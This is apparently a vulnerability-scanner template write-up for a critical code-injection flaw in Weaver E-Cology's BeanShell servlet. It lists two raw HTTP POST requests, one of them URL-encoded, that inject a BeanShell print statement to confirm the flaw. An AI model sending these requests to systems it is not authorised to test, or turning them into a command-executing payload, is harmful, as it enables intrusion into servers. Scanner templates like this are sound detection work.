# Nuclei Template: Weaver E-Cology BeanShell - Remote Command Execution
**Template ID:** weaver-ecology-bshservlet-rce
**Vulnerability Class:** Code Injection
**Severity:** Critical
**CWE:** CWE-95
**Source:** Nuclei Template (`weaver-ecology-bshservlet-rce.yaml`)

## Vulnerability Information & PoC

## Description
Weaver BeanShell contains a remote command execution vulnerability in the bsh.servlet.BshServlet program.

## Steps to reproduce / Exploit Payload
```http
POST /weaver/bsh.servlet.BshServlet HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

bsh.script=print%28%22{{randstr}}%22%29%3B

POST /weaver/bsh.servlet.BshServlet HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

%62%73%68%2e%73%63%72%69%70%74=%70%72%69%6e%74%28%22{{randstr}}%22%29%3b
```

